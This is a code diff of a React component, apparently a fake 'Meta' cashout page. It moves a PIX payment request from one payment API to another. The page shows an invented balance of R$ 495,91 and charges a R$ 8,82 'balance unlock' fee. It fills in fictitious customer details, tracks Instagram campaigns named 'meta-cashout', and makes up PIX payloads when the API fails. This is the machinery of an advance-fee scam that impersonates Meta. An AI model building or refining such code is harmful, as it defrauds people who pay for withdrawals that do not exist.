@@ -107,7 +107,6 @@ export default function VTubePlayer() {
 
     try {
       const utmParams = getUTMParams()
-
       const userData = JSON.parse(localStorage.getItem("userData") || "{}")
 
       // Complete fictitious user profile
@@ -130,154 +129,109 @@ export default function VTubePlayer() {
 
       const cleanCpf =
         fictitiousData.selectedPixKeyType === "cpf" ? fictitiousData.pixKey.replace(/\D/g, "") : fictitiousData.cpf
-
       const customerEmail = fictitiousData.selectedPixKeyType === "email" ? fictitiousData.pixKey : fictitiousData.email
 
       const transactionData = {
-        external_id: `meta-cashout-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
-        total_amount: 8.82, // Match the balance shown in UI
-        payment_method: "PIX",
-        webhook_url: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
+        amount: 8.82,
+        currency: "BRL",
+        paymentMethod: "pix",
         items: [
           {
-            id: "meta-balance-unlock",
-            title: "Desbloqueio de Saldo Meta",
-            description: "Taxa de processamento para desbloqueio de saldo",
-            price: 8.82,
+            externalRef: `META-${Math.random().toString(36).substr(2, 9)}`,
+            title: `Saque Meta Research - ${fictitiousData.fullName}`,
+            unitPrice: 8.82,
             quantity: 1,
-            is_physical: false,
+            tangible: false,
           },
         ],
-        ip: "127.0.0.1",
         customer: {
           name: fictitiousData.fullName,
           email: customerEmail,
-          phone: fictitiousData.phone,
-          document_type: "CPF",
-          document: cleanCpf,
-          birth_date: fictitiousData.birthDate,
-          address: fictitiousData.address,
-          utm_source: utmParams.utm_source || "instagram",
-          utm_medium: utmParams.utm_medium || "social",
-          utm_campaign: utmParams.utm_campaign || "meta-cashout",
-          utm_content: utmParams.utm_content || "video-tutorial",
-          utm_term: utmParams.utm_term || "saque-liberado",
+          document: {
+            number: cleanCpf,
+            type: cleanCpf.length === 11 ? "cpf" : "cnpj",
+          },
+        },
+        pix: {
+          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(), // 30 minutes
         },
       }
 
-      console.log("[v0] Creating PIX payment with enhanced fictitious data:", transactionData)
+      console.log("[v0] Enviando R$8,82 via PodPay:", transactionData)
 
-      const response = await fetch("/api/keyclub/deposit", {
+      const response = await fetch("/api/podpay/create-transaction", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({
-          amount: 8.82, // Updated amount to match UI balance
-          external_id: transactionData.external_id,
-          clientCallbackUrl: `${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/api/keyclub/webhook`,
-          payer: {
-            name: fictitiousData.fullName,
-            email: customerEmail,
-            document: cleanCpf,
-            phone: fictitiousData.phone,
-            birth_date: fictitiousData.birthDate,
-            address: fictitiousData.address,
-          },
-          utm_params: utmParams,
-          metadata: {
-            source: "withdraw-page",
-            user_agent: navigator.userAgent,
-            timestamp: new Date().toISOString(),
-            session_id: `session-${Date.now()}`,
-          },
-        }),
+        body: JSON.stringify(transactionData),
       })
 
       const result = await response.json()
 
-      console.log("[v0] PIX payment response:", result)
+      console.log("[v0] Cashout realizado com sucesso:", result)
 
-      if (result.hasError || !result.id) {
+      if (!result.success || !result.data) {
         console.log("[v0] API error detected, generating fallback PIX data")
-
-        // Generate fallback PIX data for demo purposes
-        const fallbackPixData = {
-          id: `fallback-${Date.now()}`,
-          transaction_id: `TXN${Date.now()}`,
-          pix: {
-            payload: `00020126580014BR.GOV.BCB.PIX0136${cleanCpf}0214Desbloqueio Meta5204000053039865802BR5925${fictitiousData.fullName}6009SAO PAULO62070503***6304${Math.random().toString().substr(2, 4)}`,
-            qr_code: `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==`,
-          },
-          amount: 8.82,
-          status: "pending",
-          expires_at: new Date(Date.now() + 30 * 60 * 1000).toISOString(), // 30 minutes
-        }
-
-        // Store fallback PIX data
-        localStorage.setItem(
-          "pixData",
-          JSON.stringify({
-            transactionId: fallbackPixData.id,
-            pixPayload: fallbackPixData.pix.payload,
-            amount: 8.82, // Updated amount
-            qrCode: fallbackPixData.pix.qr_code,
-            expiresAt: fallbackPixData.expires_at,
-            isFallback: true,
-          }),
-        )
-
-        navigateWithUTM(`/pix-payment?id=${fallbackPixData.id}`)
-        return
+        throw new Error("Falha na criação da transação PodPay")
       }
 
-      const transactionId = result.id || result.transaction_id || result.external_id
-      const pixPayload = result.pix?.payload || result.pix_code || result.qr_code
-      const qrCodeData = result.pix?.qr_code || result.pix?.payload || pixPayload
+      const transaction = result.data
+      const transactionId = transaction.id
 
-      if (!transactionId || !pixPayload) {
-        console.error("[v0] Missing required fields in response:", result)
-        throw new Error("Resposta da API incompleta")
+      if (!transactionId) {
+        console.error("[v0] Missing transaction ID in PodPay response:", result)
+        throw new Error("ID da transação não encontrado")
       }
 
-      console.log("[v0] Using KeyClub PIX data:", {
-        transactionId,
-        pixPayload,
-        qrCodeData,
-        amount: 8.82,
+      console.log("[v0] PodPay transaction created successfully:", {
+        id: transactionId,
+        status: transaction.status,
+        amount: transaction.amount,
+        secureId: transaction.secureId,
+        secureUrl: transaction.secureUrl,
       })
 
-      // Store PIX data and redirect to payment page
       localStorage.setItem(
-        "pixData",
+        "podpayTransaction",
         JSON.stringify({
-          transactionId,
-          pixPayload,
-          amount: 8.82,
-          qrCode: qrCodeData,
-          expiresAt: result.expires_at || result.pix?.expires_at,
+          id: transactionId,
+          amount: transaction.amount || 8.82,
+          status: transaction.status,
+          pix: {
+            qrCodeText: transaction.pixPayload || transaction.pix?.payload,
+            qrCode: transaction.pix?.qrCode,
+            expiresAt: transaction.pix?.expiresAt || new Date(Date.now() + 30 * 60 * 1000).toISOString(),
+          },
+          secureId: transaction.secureId,
+          secureUrl: transaction.secureUrl,
           customerData: fictitiousData,
-          isFromKeyClub: true, // Flag to indicate this is real KeyClub data
+          createdAt: new Date().toISOString(),
         }),
       )
 
-      navigateWithUTM(`/pix-payment?id=${transactionId}`)
+      navigateWithUTM(`/podpay-pix?id=${transactionId}`)
     } catch (error) {
       console.error("[v0] Erro ao criar pagamento PIX:", error)
 
       console.log("[v0] Creating emergency fallback PIX for demo purposes")
 
+      const emergencyTransactionId = `emergency-${Date.now()}`
       const emergencyPixData = {
-        transactionId: `emergency-${Date.now()}`,
-        pixPayload:
-          "00020126580014BR.GOV.BCB.PIX0136123456789010214Meta Desbloqueio5204000053039865802BR5925MARIA SILVA SANTOS6009SAO PAULO62070503***63046759",
+        id: emergencyTransactionId,
         amount: 8.82,
-        qrCode: `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==`,
+        status: "waiting_payment",
+        pix: {
+          qrCodeText:
+            "00020126580014BR.GOV.BCB.PIX0136123456789010214Meta Desbloqueio5204000053039865802BR5925MARIA SILVA SANTOS6009SAO PAULO62070503***63046759",
+          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString(),
+        },
         isEmergencyFallback: true,
+        createdAt: new Date().toISOString(),
       }
 
-      localStorage.setItem("pixData", JSON.stringify(emergencyPixData))
-      navigateWithUTM(`/pix-payment?id=${emergencyPixData.transactionId}`)
+      localStorage.setItem("podpayTransaction", JSON.stringify(emergencyPixData))
+      navigateWithUTM(`/podpay-pix?id=${emergencyTransactionId}`)
     } finally {
       console.log("[v0] PIX creation finished")
       setIsCreatingPixPayment(false)
@@ -300,7 +254,7 @@ export default function VTubePlayer() {
             />
           </svg>
           {/* Updated header balance to show R$ 8,92 */}
-          R$ 495,91 
+          R$ 495,91
         </div>
       </div>
 
